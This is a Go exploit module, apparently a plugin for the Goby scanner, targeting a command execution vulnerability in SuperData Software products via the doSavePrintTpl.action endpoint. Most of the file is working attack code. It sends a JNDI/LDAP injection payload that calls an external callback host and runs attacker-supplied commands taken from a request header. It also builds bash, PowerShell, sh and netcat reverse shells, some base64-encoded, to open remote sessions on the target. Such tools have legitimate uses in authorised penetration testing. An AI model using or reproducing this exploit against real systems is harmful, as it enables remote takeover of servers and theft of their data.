package exploits

import (
	"encoding/base64"
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"
)

func init() {
	expJson := `{
    "Name": "SuperData Software Multiple Products /common/print/print!doSavePrintTpl.action Command Execution Vulnerability",
    "Description": "<p>Multiple products from SuperData Software Technology (Guangzhou) Co., Ltd. are affected by a command execution vulnerability. Due to insufficient filtering of user-controllable parameters, attackers can exploit this vulnerability to execute maliciously crafted statements, allowing arbitrary command or code execution. This could lead to attackers executing arbitrary commands, performing file read/write operations on the server, and causing severe security risks.</p>",
    "Product": "SuperData Software Products",
    "Homepage": "http://www.superdata.com.cn/",
    "DisclosureDate": "2024-06-12",
    "PostTime": "2025-01-09",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "body=\"速达软件技术（广州）有限公司\" && body=\"jslib/extjs2.3/view/PasswordField.js\"",
    "GobyQuery": "body=\"速达软件技术（广州）有限公司\" && body=\"jslib/extjs2.3/view/PasswordField.js\"",
    "Level": "2",
    "Impact": "<p>Due to insufficient filtering of user-controllable parameters, attackers can exploit this vulnerability to execute maliciously crafted statements, allowing arbitrary command or code execution. This could lead to attackers executing arbitrary commands, performing file read/write operations on the server, and causing severe security risks.</p>",
    "Recommendation": "<p>1. Strictly filter and validate user input parameters.2. Update to the latest secure version provided by the vendor.3. Deploy a Web Application Firewall (WAF) to detect and block malicious requests.</p>",
    "References": [
        "https://github.com/ax1sX/SecurityList/blob/5a99da1aa91685827c1e72429fff9dc63ce7967c/Java_OA/CDGServer3_old.md?plain=1#L160"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "username",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution",
        "2H1W"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "速达软件 多款产品 /common/print/print!doSavePrintTpl.action 命令执行漏洞",
            "Product": "速达软件-公司产品",
            "Description": "<p>速达软件技术（广州）有限公司的多款产品存在命令执行漏洞。由于代码未对用户可控参数进行过滤，攻击者可以通过漏洞执行恶意构造的语句，从而执行任意命令或代码。这可能导致攻击者在服务器上执行任意命令、读写文件操作等，带来严重的安全风险。</p>",
            "Recommendation": "<p>1. 对用户输入的参数进行严格的过滤和校验。2. 更新至厂商提供的最新安全版本。3. 部署Web应用防火墙（WAF）以检测和阻止恶意请求。</p>",
            "Impact": "<p>由于代码未对用户可控参数进行过滤，攻击者可以通过漏洞执行恶意构造的语句，从而执行任意命令或代码。这可能导致攻击者在服务器上执行任意命令、读写文件操作等，带来严重的安全风险。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "SuperData Software Multiple Products /common/print/print!doSavePrintTpl.action Command Execution Vulnerability",
            "Product": "SuperData Software Products",
            "Description": "<p>Multiple products from SuperData Software Technology (Guangzhou) Co., Ltd. are affected by a command execution vulnerability. Due to insufficient filtering of user-controllable parameters, attackers can exploit this vulnerability to execute maliciously crafted statements, allowing arbitrary command or code execution. This could lead to attackers executing arbitrary commands, performing file read/write operations on the server, and causing severe security risks.</p>",
            "Recommendation": "<p>1. Strictly filter and validate user input parameters.2. Update to the latest secure version provided by the vendor.3. Deploy a Web Application Firewall (WAF) to detect and block malicious requests.</p>",
            "Impact": "<p>Due to insufficient filtering of user-controllable parameters, attackers can exploit this vulnerability to execute maliciously crafted statements, allowing arbitrary command or code execution. This could lead to attackers executing arbitrary commands, performing file read/write operations on the server, and causing severe security risks.</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "VariablesOrder": [],
    "EditType": "fast",
    "PocId": "9982"
}`

	setPayloadRequestHash0001dsadadasdasdghjghjbgffsdfdsf325435354grtgdgwtgdthtyjhgjuikkujgnhdfgfgsfdsFFds := func(hostInfo *httpclient.FixUrl, cmd string) (string, string, error) {

		loopholesRequestConfig := httpclient.NewGetRequestConfig("/common/print/print!doSavePrintTpl.action?report=${jndi:ldap://" + godclient.GetGodServerHost() + "/A4}&&rptid=1&employId=1&accsetName=1&modId=1")
		loopholesRequestConfig.FollowRedirect = false
		loopholesRequestConfig.VerifyTls = false
		loopholesRequestConfig.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36")
		loopholesRequestConfig.Header.Store("cmd", cmd)
		resp, err := httpclient.DoHttpRequest(hostInfo, loopholesRequestConfig)
		if err != nil {
			return "", "", err
		}
		url := "/common/print/print!doSavePrintTpl.action"
		return resp.Utf8Html, url, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash0001dsadadasdasdghjghjbgffsdfdsf325435354grtgdgwtgdthtyjhgjuikkujgnhdfgfgsfdsFFds

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false

		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash0001dsadadasdasdghjghjbgffsdfdsf325435354grtgdgwtgdthtyjhgjuikkujgnhdfgfgsfdsFFds

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)
				Result = strings.Split(Result, "{\"m")[0]
				lines := strings.Split(Result, "\n")
				line1 := lines[0]
				line2 := lines[1]
				if line1 == line2 {
					Result = line1
				}
				// 判断第二行是否以 {"accsetName 开头
				if strings.HasPrefix(line2, `{"accsetName`) {
					Result = line1
				}
				// 判断第一行是否以 {"accsetName 开头
				if strings.HasPrefix(line1, `{"accsetName`) {
					Result = ""
				}
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
